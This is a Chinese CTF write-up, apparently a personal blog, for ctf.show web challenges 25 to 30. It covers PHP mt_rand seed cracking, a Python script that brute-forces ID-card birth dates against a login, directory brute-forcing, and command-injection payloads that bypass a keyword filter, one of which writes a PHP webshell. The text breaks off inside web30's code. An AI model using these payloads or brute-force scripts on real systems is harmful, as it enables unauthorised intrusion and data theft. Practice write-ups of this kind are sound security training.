<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-03 13:56:57
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-03 15:47:33
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;r&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;r&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">mt_srand</span><span class="p">(</span><span class="nx">hexdec</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$flag</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="p">)));</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$rand</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$r</span><span class="p">)</span><span class="o">-</span><span class="nx">intval</span><span class="p">(</span><span class="nx">mt_rand</span><span class="p">());</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">if</span><span class="p">((</span><span class="o">!</span><span class="nv">$rand</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span><span class="o">==</span><span class="p">(</span><span class="nx">mt_rand</span><span class="p">()</span><span class="o">+</span><span class="nx">mt_rand</span><span class="p">())){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">echo</span> <span class="nv">$rand</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">echo</span> <span class="nx">system</span><span class="p">(</span><span class="s1">&#39;cat /proc/version&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>继续php伪随机数</p>
<p>我们需要知道一个性质</p>
<p>当mt_srand()中的种子是固定的，那么我们生成的随机数的序列就是相同的，如下</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">mt_srand</span><span class="p">(</span><span class="mi">1852100618</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">echo</span> <span class="nx">mt_rand</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">echo</span> <span class="nx">mt_rand</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">echo</span> <span class="nx">mt_rand</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">echo</span> <span class="nx">mt_rand</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="s1">&#39;&#39;</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="mi">1640856123</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="mi">1390302953</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="mi">893879251</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="mi">859994814</span>
</span></span></code></pre></div><p>在这道题里面我们需要得到前三个随机数</p>
<p>第一个随机数我们可以使r=0得到，第一个随机数为1640856123</p>
<p><img alt="image-20241124162638637" loading="lazy" src="assets/image-20241124162638637.png"></p>
<p>得到第一个随机数之后我们可以通过爆破的方式得到种子，从而得到第二，第三个随机数</p>
<p>php脚本(极其慢)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nv">$a</span><span class="o">=</span> <span class="mi">390148868</span><span class="p">;</span><span class="c1">//第一个随机数
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1"></span><span class="nv">$b</span><span class="o">=</span> <span class="mi">0</span> <span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="k">true</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="nx">mt_srand</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">mt_rand</span><span class="p">()</span><span class="o">==</span><span class="nv">$a</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;success:&#34;</span><span class="o">+</span><span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="nv">$b</span><span class="o">+=</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>或者使用php_mt_seed-4.0工具</p>
<p><img alt="image-20241124163359970" loading="lazy" src="assets/image-20241124163359970.png"></p>
<p>我们可以看到不同版本的seed是不同的，我们一个个试试就行了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">mt_srand</span><span class="p">(</span><span class="mi">1852100618</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="k">echo</span> <span class="nx">mt_rand</span><span class="p">();</span><span class="c1">// 第一次随机数（不能少）
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">token：&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="k">echo</span> <span class="p">(</span><span class="nx">mt_rand</span><span class="p">()</span><span class="o">+</span><span class="nx">mt_rand</span><span class="p">());</span> <span class="c1">//第二和第三次随机数相加，也就是我们要对token
</span></span></span></code></pre></div><p>得到token的值，我们只需要使rand为零即可得到flag</p>
<p>也就是说我们只需要使r等于第一次随机数即可</p>
<p>传参，得到flag</p>
<p><img alt="image-20241124163754599" loading="lazy" src="assets/image-20241124163754599.png"></p>
<h4 id="web26">web26<a hidden class="anchor" aria-hidden="true" href="#web26">#</a></h4>
<p><img alt="image-20241124173300016" loading="lazy" src="assets/image-20241124173300016.png"></p>
<p>这么多我咋爆，赌一把只爆密码</p>
<p><img alt="image-20241124173340723" loading="lazy" src="assets/image-20241124173340723.png"></p>
<h4 id="web27">web27<a hidden class="anchor" aria-hidden="true" href="#web27">#</a></h4>
<p><img alt="image-20241124201909506" loading="lazy" src="assets/image-20241124201909506.png"></p>
<p>这题是一个教务系统，需要通过账号密码登录</p>
<p>先信息收集一下</p>
<p>我们可以看到在账号密码下面有一个录取名单和学生学籍信息查询系统</p>
<p><img alt="image-20241124202141536" loading="lazy" src="assets/image-20241124202141536.png"></p>
<p><img alt="image-20241124202155511" loading="lazy" src="assets/image-20241124202155511.png"></p>
<p>分别如上，那我们是否可以通过爆破学生的身份证信息从而通过录取查询查到学生的信息呢？</p>
<p>bp抓个包</p>
<p><img alt="image-20241124203316274" loading="lazy" src="assets/image-20241124203316274.png"></p>
<p>哎我草，我数据呢</p>
<p>forward一下（是因为数据实际上在checkdb.php才提交吗？不是很懂）</p>
<p><img alt="image-20241124203440000" loading="lazy" src="assets/image-20241124203440000.png"></p>
<p>我们可以发现其实身份证缺失的部分刚好是出生日期</p>
<p>那我们可以用bp中的日期爆破功能</p>
<p><img alt="image-20241124205446714" loading="lazy" src="assets/image-20241124205446714.png"></p>
<p><img alt="image-20241124211229000" loading="lazy" src="assets/image-20241124211229000.png"></p>
<p>爆出来的msg用unicode解码一下就能得到账号密码了</p>
<p><img alt="image-20241124211334906" loading="lazy" src="assets/image-20241124211334906.png"></p>
<p>贴个大佬的脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s1">&#39;https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php&#39;</span> <span class="n">NUM</span><span class="o">=</span><span class="mi">32</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">def</span> <span class="nf">run_tasks</span><span class="p">(</span><span class="n">L</span><span class="p">):</span> <span class="n">U</span><span class="o">=</span><span class="p">[]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">L</span><span class="p">:</span> <span class="n">U</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">asyncio</span><span class="o">.</span><span class="n">ensure_future</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="n">loop</span> <span class="o">=</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">get_event_loop</span><span class="p">()</span> <span class="n">loop</span><span class="o">.</span><span class="n">run_until_complete</span><span class="p">(</span><span class="n">asyncio</span><span class="o">.</span><span class="n">wait</span><span class="p">(</span><span class="n">U</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">class</span> <span class="nc">TaskRuner</span><span class="p">:</span> <span class="k">def</span> <span class="nf">init</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">n</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">L</span><span class="o">=</span><span class="p">[]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span> <span class="bp">self</span><span class="o">.</span><span class="n">L</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">task_function</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="bp">self</span><span class="o">.</span><span class="n">task_num</span><span class="o">=</span><span class="n">n</span> <span class="k">async</span> <span class="k">def</span> <span class="nf">task_function</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">n</span><span class="p">):</span> <span class="k">pass</span> <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span> <span class="n">run_tasks</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">L</span><span class="p">)</span> <span class="bp">self</span><span class="o">.</span><span class="n">on_over</span><span class="p">()</span> <span class="k">def</span> <span class="nf">on_over</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span> <span class="k">pass</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kn">import</span> <span class="nn">aiohttp</span> <span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span> <span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">date</span><span class="p">,</span> <span class="n">timedelta</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">class</span> <span class="nc">NYR</span><span class="p">:</span> <span class="k">def</span> <span class="nf">init</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">start_date</span><span class="p">,</span><span class="n">end_date</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">start_date</span><span class="o">=</span><span class="n">start_date</span> <span class="bp">self</span><span class="o">.</span><span class="n">end_date</span><span class="o">=</span><span class="n">end_date</span> <span class="bp">self</span><span class="o">.</span><span class="n">delta</span> <span class="o">=</span> <span class="n">timedelta</span><span class="p">(</span><span class="n">days</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="bp">self</span><span class="o">.</span><span class="n">current_date</span> <span class="o">=</span> <span class="n">start_date</span> <span class="k">def</span> <span class="nf">next</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span> <span class="n">t</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">current_date</span> <span class="k">if</span> <span class="n">t</span><span class="o">&gt;</span><span class="bp">self</span><span class="o">.</span><span class="n">end_date</span><span class="p">:</span> <span class="k">return</span> <span class="kc">None</span> <span class="bp">self</span><span class="o">.</span><span class="n">current_date</span><span class="o">+=</span><span class="bp">self</span><span class="o">.</span><span class="n">delta</span> <span class="k">return</span> <span class="n">t</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">class</span> <span class="nc">Scanner</span><span class="p">(</span><span class="n">TaskRuner</span><span class="p">):</span> <span class="k">def</span> <span class="nf">init</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">d1</span><span class="p">,</span><span class="n">d2</span><span class="p">,</span><span class="n">n</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span> <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="n">init</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="bp">self</span><span class="o">.</span><span class="n">nyr</span><span class="o">=</span><span class="n">NYR</span><span class="p">(</span><span class="n">d1</span><span class="p">,</span><span class="n">d2</span><span class="p">)</span> <span class="bp">self</span><span class="o">.</span><span class="n">alive</span><span class="o">=</span><span class="kc">True</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">task_function</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">alive</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">u</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">nyr</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">u</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="n">r</span><span class="o">=</span><span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="n">u</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">alive</span><span class="o">=</span><span class="kc">False</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">t</span><span class="p">:</span><span class="n">date</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="n">url</span><span class="o">=</span><span class="s1">&#39;https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php&#39;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="n">n</span><span class="o">=</span><span class="n">t</span><span class="o">.</span><span class="n">year</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="n">y</span><span class="o">=</span><span class="n">t</span><span class="o">.</span><span class="n">month</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="n">r</span><span class="o">=</span><span class="n">t</span><span class="o">.</span><span class="n">day</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="n">n</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="n">y</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="n">r</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="n">y</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">+</span><span class="n">y</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="n">r</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">+</span><span class="n">r</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="n">sfz</span><span class="o">=</span><span class="s1">&#39;621022&#39;</span><span class="o">+</span><span class="n">n</span><span class="o">+</span><span class="n">y</span><span class="o">+</span><span class="n">r</span><span class="o">+</span><span class="s1">&#39;5237&#39;</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">    <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="s1">&#39;a&#39;</span><span class="p">:</span><span class="s1">&#39;高先伊&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="s1">&#39;p&#39;</span><span class="p">:</span><span class="n">sfz</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="n">sess</span><span class="o">=</span><span class="n">aiohttp</span><span class="o">.</span><span class="n">ClientSession</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="n">r</span><span class="o">=</span><span class="k">await</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">ssl</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">        <span class="n">text</span><span class="o">=</span><span class="k">await</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="n">js</span><span class="o">=</span><span class="n">loads</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="n">msg</span><span class="o">=</span><span class="n">js</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">sfz</span><span class="p">,</span><span class="n">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="k">await</span> <span class="n">sess</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">        <span class="k">return</span> <span class="n">msg</span><span class="o">!=</span><span class="s1">&#39;提交信息有误&#39;</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">        <span class="k">await</span> <span class="n">sess</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">
</span></span><span class="line"><span class="ln">56</span><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">handle_up</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">u</span><span class="p">,</span><span class="n">p</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="ln">58</span><span class="cl"><span class="n">a</span><span class="o">=</span><span class="n">Scanner</span><span class="p">(</span><span class="n">date</span><span class="p">(</span><span class="mi">1990</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="n">date</span><span class="p">(</span><span class="mi">2010</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">12</span><span class="p">),</span><span class="n">NUM</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">59</span><span class="cl">
</span></span><span class="line"><span class="ln">60</span><span class="cl"><span class="n">a</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span></span></code></pre></div><h4 id="web28">web28<a hidden class="anchor" aria-hidden="true" href="#web28">#</a></h4>
<p><img alt="image-20241124212238261" loading="lazy" src="assets/image-20241124212238261.png"></p>
<p>这题本来不知道要干嘛</p>
<p><img alt="image-20241124212302234" loading="lazy" src="assets/image-20241124212302234.png"></p>
<p>dirsearch扫一下,感觉应该是目录爆破</p>
<p><img alt="image-20241124213646757" loading="lazy" src="assets/image-20241124213646757.png"></p>
<p>先爆破一下0-100</p>
<p><img alt="image-20241124220027195" loading="lazy" src="assets/image-20241124220027195.png"></p>
<h3 id="命令执行"><strong>命令执行</strong>：<a hidden class="anchor" aria-hidden="true" href="#命令执行">#</a></h3>
<h4 id="web29">web29<a hidden class="anchor" aria-hidden="true" href="#web29">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:26:48
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>可以看到通过eval函数可以执行php代码或者系统命令，其中过滤了flag。</p>
<p>进行绕过就行，解法很多</p>
<blockquote>
<ol>
<li>
<p>c=system(&ldquo;cat fl*g.php | grep  -E &lsquo;fl.g&rsquo; &ldquo;);</p>
</li>
<li>
<p>c=system(&ldquo;tac fl*g.php&rdquo;);</p>
</li>
<li>
<p>c=system(&ldquo;cat fl*g.php&rdquo;);（用cat要右键查看源代码才能看到回显）</p>
</li>
<li>
<p>c=system(&ldquo;cp fl*g.php a.txt &ldquo;);（访问a.txt查看）</p>
</li>
<li>
<p>c=system(&rsquo;echo -e &quot; &lt;?php \n error_reporting(0); \n  $c= $_GET['c']; \n eval($c); &quot; &gt; a.php&rsquo;); //直接新建一个页面并写入一句话木马
（/a.php?c=system(&ldquo;tac flag.php&rdquo;);）</p>
</li>
<li>
<p>?c=echo `tac fla*`;</p>
<p>&hellip;.</p>
</li>
</ol></blockquote>
<h4 id="web30">web30<a hidden class="anchor" aria-hidden="true" href="#web30">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
